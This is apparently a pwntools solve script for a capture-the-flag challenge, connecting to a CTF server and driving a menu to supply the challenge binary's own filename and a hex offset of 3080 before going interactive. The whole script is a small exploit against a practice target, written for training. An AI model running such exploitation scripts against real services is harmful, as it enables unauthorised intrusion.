#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r)
    else:
        r = remote("pwn.hackini25.shellmates.club", 1401, ssl=True)

    return r


def main():

    r = conn()
    r.recvuntil(b'> ')
    
    r.sendline(b'1')
    r.recvuntil(b'Enter filename: ')
    
    r.sendline(b'chall')
    r.recvuntil(b'Enter offset (in hex):')
    
    r.sendline(b"3080") # offset from xxd local binary 

    r.sendline(b"2") # exit
    
    r.interactive()
    r.close()
            


if __name__ == "__main__":
    main()
